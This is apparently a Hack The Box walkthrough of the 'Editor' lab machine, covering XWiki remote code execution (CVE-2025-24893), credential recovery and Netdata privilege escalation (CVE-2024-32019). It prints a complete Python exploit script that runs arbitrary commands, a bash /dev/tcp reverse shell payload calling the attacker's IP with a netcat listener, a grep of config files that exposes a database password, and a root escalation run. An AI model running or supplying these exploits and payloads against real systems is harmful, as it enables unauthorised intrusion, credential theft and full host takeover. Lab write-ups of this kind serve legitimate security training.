
### Initial access

Add host
```
sudo echo  "10.129.231.23 editor.htb" | sudo tee -a /etc/hosts

```

Access port 8080 and have `XWiki Debian 15.10.8 `
```
┌──(kali㉿kali)-[~/HTB/Editor]
└─$ searchsploit xwiki                                            
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
XWiki 14 - SQL Injection via getdeleteddocuments.vm                                                                                                                                                        | multiple/webapps/52384.c
XWiki 4.2-milestone-2 - Multiple Persistent Cross-Site Scripting Vulnerabilities                                                                                                                           | php/webapps/20856.txt
Xwiki CMS 12.10.2 - Cross Site Scripting (XSS)                                                                                                                                                             | multiple/webapps/49437.txt
XWiki Platform 15.10.10 - Metasploit Module for Remote Code Execution (RCE)                                                                                                                                | multiple/webapps/52429.txt
XWiki Platform 15.10.10 - Remote Code Execution                                                                                                                                                            | multiple/webapps/52136.txt
XWiki Standard 14.10 - Remote Code Execution (RCE)                                                                                                                                                         | php/webapps/52105.py
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/HTB/Editor]
└─$ searchsploit -m multiple/webapps/52136.txt                                                  

  Exploit: XWiki Platform 15.10.10 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/52136
     Path: /usr/share/exploitdb/exploits/multiple/webapps/52136.txt
    Codes: CVE-2025-24893
 Verified: False
File Type: Python script, Unicode text, UTF-8 text executable
Copied to: /home/kali/HTB/Editor/52136.txt

```
After we run exploit but now we just have read data let modify exlpot for shell exploit
```
<?xml version="1.0" encoding="UTF-8"?>
<rss xmlns:dc="http://purl.org/dc/elements/1.1/" version="2.0">
  <channel>
    <title>RSS feed for search on [}}}root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:114:65534:dnsmasq,:/var/lib/misc:/usr/sbin/nologin
mysql:x:115:121:MySQL Server,:/nonexistent:/bin/false
tomcat:x:998:998:Apache Tomcat:/var/lib/tomcat:/usr/sbin/nologin
xwiki:x:997:997:XWiki:/var/lib/xwiki:/usr/sbin/nologin
netdata:x:996:999:netdata:/opt/netdata:/usr/sbin/nologin
oliver:x:1000:1000:,:/home/oliver:/bin/bash
_laurel:x:995:995::/var/log/laurel:/bin/false]</title>
    <link>http://editor.htb:8080/xwiki/bin/view/Main/SolrSearch?text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%22cat%20%2Fetc%2Fpasswd%22.execute%28%29.text%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D</link>
    <description>RSS feed for search on [}}}root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:114:65534:dnsmasq,:/var/lib/misc:/usr/sbin/nologin
mysql:x:115:121:MySQL Server,:/nonexistent:/bin/false
tomcat:x:998:998:Apache Tomcat:/var/lib/tomcat:/usr/sbin/nologin
xwiki:x:997:997:XWiki:/var/lib/xwiki:/usr/sbin/nologin
netdata:x:996:999:netdata:/opt/netdata:/usr/sbin/nologin
oliver:x:1000:1000:,:/home/oliver:/bin/bash
_laurel:x:995:995::/var/log/laurel:/bin/false]</description>
    <language>en</language>
    <copyright />
    <dc:creator>XWiki</dc:creator>
    <dc:language>en</dc:language>
    <dc:rights />
  </channel>
</rss>
```

So the thing is use can trigger reverse shell imdiately in the payload you have to upload the rev shell file to the server and execute it in second rce
```bash
┌──(kali㉿kali)-[~/HTB/Editor]
└─$ cat > rev.sh << 'EOF'
setsid bash -c 'bash -i >& /dev/tcp/10.10.16.212/443 0>&1' & 
EOF
python3 -m http.server 8000
┌──(kali㉿kali)-[~/HTB/Editor]
└─$ cat > rev.sh << 'EOF'
setsid bash -c 'bash -i >& /dev/tcp/10.10.16.212/443 0>&1' & 
EOF
python3 -m http.server 8000


┌──(kali㉿kali)-[~/HTB/Editor]
└─$ python3 exp.py
================================================================================
Exploit Title: CVE-2025-24893 - XWiki Platform Remote Code Execution
Made By Al Baradi Joy
Modified by F.R.A.N.K — any shell command, no hardcoded training wheels
================================================================================
[?] Enter the target URL (without http/https): http://editor.htb:8080/xwiki
[?] Enter the shell command to execute: bash /tmp/rev
[!] HTTPS not available, falling back to HTTP.

[✔] Target supports HTTP: http://editor.htb:8080/xwiki
[+] Sending request to: http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22bash%20%2Ftmp%2Frev%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d
[✖] Request timed out. Target is slow or unresponsive.
                                                        
```
 We have revshell
 ```bash
 ┌──(kali㉿kali)-[~/HTB/Editor]
└─$ rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.16.212] from (UNKNOWN) [10.129.231.23] 54700
bash: cannot set terminal process group (12381): Inappropriate ioctl for device
bash: no job control in this shell
xwiki@editor:/usr/lib/xwiki-jetty$ 


 ```
### Custom exploit
```python
┌──(kali㉿kali)-[~/HTB/Editor]
└─$ cat exp.py
import requests
import urllib.parse

# Banner
def display_banner():
    print("="*80)
    print("Exploit Title: CVE-2025-24893 - XWiki Platform Remote Code Execution")
    print("Made By Al Baradi Joy")
    print("Modified by F.R.A.N.K — any shell command, no hardcoded training wheels")
    print("="*80)

# Function to detect the target protocol (HTTP or HTTPS)
def detect_protocol(domain):
    https_url = f"https://{domain}"
    http_url = f"http://{domain}"

    try:
        response = requests.get(https_url, timeout=5, allow_redirects=True)
        if response.status_code < 400:
            print(f"[✔] Target supports HTTPS: {https_url}")
            return https_url
    except requests.exceptions.RequestException:
        print("[!] HTTPS not available, falling back to HTTP.")

    try:
        response = requests.get(http_url, timeout=5, allow_redirects=True)
        if response.status_code < 400:
            print(f"[✔] Target supports HTTP: {http_url}")
            return http_url
    except requests.exceptions.RequestException:
        print("[✖] Target is unreachable on both HTTP and HTTPS.")
        exit(1)

# Exploit function — now takes a command
def exploit(target_url, command):
    target_url = detect_protocol(target_url.replace("http://", "").replace("https://", "").strip())
    # URL-encode the command so it fits inside the Groovy string
    encoded_cmd = urllib.parse.quote(command, safe='')
    payload = (
        f"{target_url}/bin/get/Main/SolrSearch"
        f"?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7d"
        f"println(%22{encoded_cmd}%22.execute().text)"
        f"%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d"
    )

    try:
        print(f"[+] Sending request to: {payload}")
        response = requests.get(payload, timeout=10)

        # Check if the exploit was successful
        if response.status_code == 200:
            print("[✔] Exploit successful! Output received:")
            print(response.text)
        else:
            print(f"[✖] Exploit failed. Status code: {response.status_code}")

    except requests.exceptions.ConnectionError:
        print("[✖] Connection failed. Target may be down.")
    except requests.exceptions.Timeout:
        print("[✖] Request timed out. Target is slow or unresponsive.")
    except requests.exceptions.RequestException as e:
        print(f"[✖] Unexpected error: {e}")

# Main execution
if __name__ == "__main__":
    display_banner()
    target = input("[?] Enter the target URL (without http/https): ").strip()
    cmd = input("[?] Enter the shell command to execute: ").strip()
    exploit(target, cmd)
                         
```
### Lateral Movement
Reading config file
```
xwiki@editor:~$ grep -ri "password" /etc/xwiki 2>/dev/null
grep -ri "password" /etc/xwiki 2>/dev/null
/etc/xwiki/hibernate.cfg.xml:    <property name="hibernate.connection.password">theEd1t0rTeam99</property>
/etc/xwiki/hibernate.cfg.xml:    <property name="hibernate.connection.password">xwiki</property>
/etc/xwiki/hibernate.cfg.xml:    <property name="hibernate.connection.password">xwiki</property>
/etc/xwiki/hibernate.cfg.xml:    <property name="hibernate.connection.password"></property>
/etc/xwiki/hibernate.cfg.xml:    <property name="hibernate.connection.password">xwiki</property>
/etc/xwiki/hibernate.cfg.xml:    <property name="hibernate.connection.password">xwiki</property>
/etc/xwiki/hibernate.cfg.xml:    <property name="hibernate.connection.password"></property>
/etc/xwiki/xwiki.properties:#-# * password: the password to use to authenticate to the repository
/etc/xwiki/xwiki.properties:# extension.repositories.privatemavenid.auth.password = thepassword
/etc/xwiki/xwiki.properties:#-# Define the lifetime of the token used for resetting passwords in minutes. Note that this value is only used after
/etc/xwiki/xwiki.properties:#-# Use a different value if the reset password email link might be accessed several times (e.g. in case of using an
/etc/xwiki/xwiki.properties:# security.authentication.resetPasswordTokenLifetime = 0
/etc/xwiki/xwiki.properties:#-# This parameter defines if as part of the migration R140600000XWIKI19869 the passwords of impacted user should be
/etc/xwiki/xwiki.properties:#-# their users to keep their passwords nevertheless, then enable the configuration and set it to false before the
/etc/xwiki/xwiki.properties:# security.migration.R140600000XWIKI19869.resetPassword = true
/etc/xwiki/xwiki.properties:#-# This parameter defines if reset password emails should be sent as part of the migration R140600000XWIKI19869.
/etc/xwiki/xwiki.properties:#-# this option to false: note that in such case a file containing the list of users for whom a reset password email
/etc/xwiki/xwiki.properties:# security.migration.R140600000XWIKI19869.sendResetPasswordEmail = true
/etc/xwiki/xwiki.properties:#-# this option to false: note that in such case a file containing the list of users for whom a reset password email
/etc/xwiki/xwiki.properties:#-# Password to authenticate on the SMTP server, if needed. By default no authentication is performed.
/etc/xwiki/xwiki.properties:#-# This configuration property can be overridden in XWikiPreferences objects, by using the "smtp_server_password"
/etc/xwiki/xwiki.properties:# mail.sender.password = somepassword
/etc/xwiki/hibernate.cfg.xml.ucf-dist:    <property name="hibernate.connection.password">xwikipassword2025</property>
/etc/xwiki/hibernate.cfg.xml.ucf-dist:    <property name="hibernate.connection.password">xwiki</property>
/etc/xwiki/hibernate.cfg.xml.ucf-dist:    <property name="hibernate.connection.password">xwiki</property>
/etc/xwiki/hibernate.cfg.xml.ucf-dist:    <property name="hibernate.connection.password"></property>
/etc/xwiki/hibernate.cfg.xml.ucf-dist:    <property name="hibernate.connection.password">xwiki</property>
/etc/xwiki/hibernate.cfg.xml.ucf-dist:    <property name="hibernate.connection.password">xwiki</property>
/etc/xwiki/hibernate.cfg.xml.ucf-dist:    <property name="hibernate.connection.password"></property>
/etc/xwiki/fonts/LICENSE-freefont:source code form), and must require no special password or key for
/etc/xwiki/xwiki.cfg:# xwiki.superadminpassword=system

```

We have cred `oliver:theEd1t0rTeam99`

### Priv escalation

We see netdata suid in bu recon local port and check suid binaty  after seaching duing this poc https://github.com/T1erno/CVE-2024-32019-Netdata-ndsudo-Privilege-Escalation-PoC.git
to get root
```bash
oliver@editor:~$ bash CVE-2024-32019.sh 
[+] ndsudo found at: /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
[+] File 'nvme' found in the current directory.
[+] Execution permissions granted to ./nvme
[+] Running ndsudo with modified PATH:
root@editor:/home/oliver# id
uid=0(root) gid=0(root) groups=0(root),999(netdata),1000(oliver)
root@editor:/home/oliver# 

```
### Post exploit